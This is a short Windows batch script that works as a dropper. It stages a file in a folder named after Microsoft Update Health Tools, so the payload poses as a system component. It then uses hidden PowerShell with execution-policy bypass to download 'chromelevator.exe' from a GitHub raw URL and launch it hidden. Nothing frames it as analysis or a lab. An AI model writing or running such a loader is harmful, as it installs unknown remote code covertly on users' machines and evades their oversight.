@echo off
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/chromelevator.exe' -OutFile '%STAGE%\chromelevator.exe' -UseBasicParsing"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\chromelevator.exe' -WindowStyle Hidden"
